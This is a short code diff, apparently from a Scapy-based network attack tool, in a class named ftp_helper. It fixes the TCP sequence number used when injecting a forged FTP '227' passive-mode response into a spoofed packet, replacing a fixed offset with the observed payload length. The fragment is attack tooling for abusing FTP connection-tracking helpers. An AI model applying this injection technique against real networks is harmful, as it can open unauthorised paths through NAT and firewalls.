@@ -56,7 +56,7 @@ class ftp_helper(attack_target):
             att[IP].id = pkt[IP].id + 1
             del att[IP].chksum
             del att[IP].len
-            att[TCP].seq = pkt[TCP].seq + 48
+            att[TCP].seq = pkt[TCP].seq + len(pkt[TCP].payload)
             del att[TCP].chksum
             att[TCP].payload = self.build_227_command()
             # send packet
